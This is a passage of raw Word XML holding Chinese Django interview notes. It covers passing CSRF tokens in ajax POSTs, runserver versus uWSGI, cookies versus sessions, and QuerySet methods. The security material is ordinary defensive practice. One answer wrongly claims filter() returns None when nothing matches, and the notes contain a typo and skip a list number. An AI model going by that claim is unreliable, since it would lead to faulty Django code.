        </w:rPr>
        <w:t>#解决方法:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="333B16BE" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>#    1.客户度端：表单提交之前或者url传递之前,对需要的参数进行过滤</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F1579A" w14:textId="0027C10D" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    2.服务器端：检查用户输入的内容是否有非法内容</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB7CFE2" w14:textId="486011FF" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="007161A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016</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>基于</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ajax</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>发送</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>请求时，都可以使用哪种方法携带</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>csrf token</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CAF09D0" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.后端将csrftoken传到前端，发送post请求时携带这个值发送</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72183BF0" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>data: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C05C0D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">             csrfmiddlewaretoken: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'{{ csrf_token }}'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C982DEC" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35269059" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.获取form中隐藏标签的csrftoken值，加入到请求数据中传给后端</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237C8977" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> data: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB2599E" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         csrfmiddlewaretoken:$(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'[name="csrfmiddlewaretoken"]'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>).val()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0424F5DE" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F8F5AE" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#3.cookie中存在csrftoken,将csrftoken值放到请求头中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1354AFE7" w14:textId="4CAAEA36" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">headers:{ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"X-CSRFtoken"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>:$.cookie(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"csrftoken"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)}，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32ECDF00" w14:textId="6919F60F" w:rsidR="00325D76" w:rsidRPr="007161AA" w:rsidRDefault="007161AA" w:rsidP="007161AA">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017</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>本身提供了</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>runserver</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>，为什么不能用来部署？</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>(runserver</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4433D1AD" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.runserver方法是调试 Django 时经常用到的运行方式，它使用Django自带的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12FFA90D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#WSGI Server 运行，主要在测试和开发中使用，并且 runserver 开启的方式也是单进程 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75050AF8" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.uWSGI是一个Web服务器，它实现了WSGI协议、uwsgi、http 等协议。注意uwsgi是一种通信协议，而uWSGI是实现uwsgi协议和WSGI协议的 Web 服务器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D82D596" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#uWSGI具有超快的性能、低内存占用和多app管理等优点，并且搭配着Nginx就是一个生产环境了，能够将用户访问请求与应用 app 隔离开，实现真正的部署 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5337DC44" w14:textId="7C15A049" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#相比来讲，支持的并发量更高，方便管理多进程，发挥多核的优势，提升性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D8FAEA" w14:textId="669852B0" w:rsidR="00325D76" w:rsidRPr="007161AA" w:rsidRDefault="007161AA" w:rsidP="007161AA">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018</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的区别：</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007161AA">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341EB222" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.cookie:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A49500" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    cookie是保存在浏览器端的键值对,可以用来做用户认证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF4E1E2" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.session：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598AA6D7" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#   将用户的会话信息保存在服务端,key值是随机产生的自符串,value值时session的内容</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="372F7D2B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    依赖于cookie将每个用户的随机字符串保存到用户浏览器上</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E1A626" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#Django中session默认保存在数据库中：django_session表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE41B53" w14:textId="2C5B84D3" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#flask,session默认将加密的数据写在用户的cookie中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4B970D" w14:textId="5FE2F567" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="007161AA"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019</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>列举</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">django orm </w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中所有的方法（</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>QuerySet</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>对象的所有方法）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AEE8A6B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#&lt;1&gt; all():                  查询所有结果 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C40E34B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#&lt;2&gt; filter(**kwargs):       它包含了与所给筛选条件相匹配的对象。获取不到返回None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705C8577" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>#&lt;3&gt; get(**kwargs):          返回与所给筛选条件相匹配的对象，返回结果有且只有一个。获取不到会抱胸</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2879228A" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#如果符合筛选条件的对象超过一个或者没有都会抛出错误。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2EC8CC" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#&lt;4&gt; exclude(**kwargs):      它包含了与所给筛选条件不匹配的对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDA0A94" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#&lt;5&gt; order_by(*field):       对查询结果排序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD4D31D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#&lt;6&gt; reverse():              对查询结果反向排序 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B3E96A" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#&lt;8&gt; count():                返回数据库中匹配查询(QuerySet)的对象数量。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E0E2DF2" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#&lt;9&gt; first():                返回第一条记录 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31057DBA" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
